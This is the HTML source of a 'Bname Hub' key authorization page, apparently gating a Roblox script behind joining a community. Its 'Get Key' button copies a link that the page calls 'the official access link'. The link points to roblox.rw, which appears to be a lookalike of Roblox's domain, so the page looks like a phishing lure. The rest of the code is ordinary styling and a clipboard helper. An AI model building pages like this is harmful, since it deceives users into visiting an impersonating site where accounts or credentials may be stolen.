<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bname Key System</title>
  <!-- Tailwind CSS CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- Google Fonts: Inter & JetBrains Mono -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
  <!-- Phosphor Icons for smooth modern UI icons -->
  <script src="https://unpkg.com/@phosphor-icons/web"></script>
  
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
    /* Ambient Glowing Background Effect */
    .glow-bg {
      background: radial-gradient(circle at 50% 40%, rgba(147, 51, 234, 0.25), rgba(6, 182, 212, 0.15) 40%, rgba(15, 23, 42, 0) 70%);
    }
    /* Modern Glassmorphism Styling */
    .glass-card {
      background: rgba(30, 41, 59, 0.65);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }
    /* Button Glow Hover Effect */
    .btn-glow {
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }
    .btn-glow:hover {
      box-shadow: 0 0 25px rgba(6, 182, 212, 0.5), 0 0 10px rgba(147, 51, 234, 0.5);
      transform: translateY(-2px);
    }
    .btn-glow:active {
      transform: translateY(0);
    }
  </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4 relative overflow-hidden">

  <!-- Ambient Light Effects -->
  <div class="absolute inset-0 glow-bg pointer-events-none"></div>
  <div class="absolute -top-32 -left-32 w-80 h-80 bg-purple-600/20 rounded-full blur-3xl pointer-events-none"></div>
  <div class="absolute -bottom-32 -right-32 w-80 h-80 bg-cyan-500/20 rounded-full blur-3xl pointer-events-none"></div>

  <!-- Hidden text area for reliable clipboard copy workaround -->
  <textarea id="copyBuffer" class="sr-only" aria-hidden="true"></textarea>

  <!-- Key System Card -->
  <main class="w-full max-w-md glass-card rounded-3xl p-6 sm:p-8 relative z-10 border border-slate-700/50">
    
    <!-- Header / Branding -->
    <div class="text-center mb-6">
      <!-- Neon Logo Emblem -->
      <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-gradient-to-tr from-purple-600 via-indigo-600 to-cyan-400 p-[2px] shadow-lg shadow-purple-500/30 mb-4 group transition-transform duration-300 hover:scale-105">
        <div class="w-full h-full bg-slate-950 rounded-[14px] flex items-center justify-center">
          <i class="ph-bold ph-key-return text-3xl text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-cyan-400"></i>
        </div>
      </div>
      
      <h1 class="text-2xl font-extrabold tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-white via-slate-200 to-slate-400">
        BNAME <span class="text-cyan-400">HUB</span>
      </h1>
      <p class="text-xs uppercase tracking-widest font-semibold text-slate-400 mt-1">Key Authorization System</p>
    </div>

    <!-- Alert / Requirement Box -->
    <div class="bg-purple-950/40 border border-purple-500/30 rounded-2xl p-4 mb-6 flex items-start gap-3.5">
      <div class="p-2 bg-purple-500/10 rounded-xl text-purple-400 shrink-0 mt-0.5">
        <i class="ph-bold ph-users-three text-xl"></i>
      </div>
      <div>
        <h2 class="text-sm font-semibold text-purple-200 mb-0.5">Community Required</h2>
        <p class="text-xs text-slate-300 leading-relaxed">
          To run script u must join our community.
        </p>
      </div>
    </div>

    <!-- Key Actions -->
    <div class="space-y-3">
      <!-- Primary Action Button -->
      <button id="getKeyBtn" onclick="copyCommunityLink()" class="w-full py-3.5 px-5 rounded-2xl bg-gradient-to-r from-purple-600 to-cyan-500 text-white font-bold text-sm tracking-wide flex items-center justify-center gap-2.5 btn-glow shadow-lg shadow-purple-900/40 cursor-pointer">
        <i class="ph-bold ph-key text-lg"></i>
        <span>Get Key</span>
      </button>

      <!-- Subtext note -->
      <p class="text-center text-[11px] text-slate-400">
        Clicking will copy the official access link to your clipboard.
      </p>
    </div>

    <!-- Modern Toast Notification -->
    <div id="toast" class="fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-900/95 border border-cyan-500/40 text-cyan-200 px-4 py-3 rounded-2xl shadow-2xl flex items-center gap-2.5 text-xs font-medium transition-all duration-300 opacity-0 translate-y-4 pointer-events-none backdrop-blur-md">
      <div class="w-2 h-2 rounded-full bg-cyan-400 animate-ping"></div>
      <i class="ph-bold ph-check-circle text-cyan-400 text-lg"></i>
      <span>Link copied to clipboard!</span>
    </div>

  </main>

  <script>
    // Target community URL
    const TARGET_LINK = "https://www.roblox.rw/communities/798537981879/bname";

    function copyCommunityLink() {
      // Reliable copy method for frame environments
      const buffer = document.getElementById("copyBuffer");
      buffer.value = TARGET_LINK;
      buffer.select();
      buffer.setSelectionRange(0, 99999); // Mobile support

      try {
        document.execCommand('copy');
        showToast();
      } catch (err) {
        // Fallback using modern clipboard API if execCommand fails
        if (navigator.clipboard) {
          navigator.clipboard.writeText(TARGET_LINK).then(() => {
            showToast();
          });
        }
      }
    }

    let toastTimeout;
    function showToast() {
      const toast = document.getElementById("toast");
      
      // Reset state if clicked rapidly
      clearTimeout(toastTimeout);
      
      // Reveal toast
      toast.classList.remove("opacity-0", "translate-y-4", "pointer-events-none");
      toast.classList.add("opacity-100", "translate-y-0");

      // Hide toast after 3 seconds
      toastTimeout = setTimeout(() => {
        toast.classList.remove("opacity-100", "translate-y-0");
        toast.classList.add("opacity-0", "translate-y-4", "pointer-events-none");
      }, 3000);
    }
  </script>
</body>
</html>
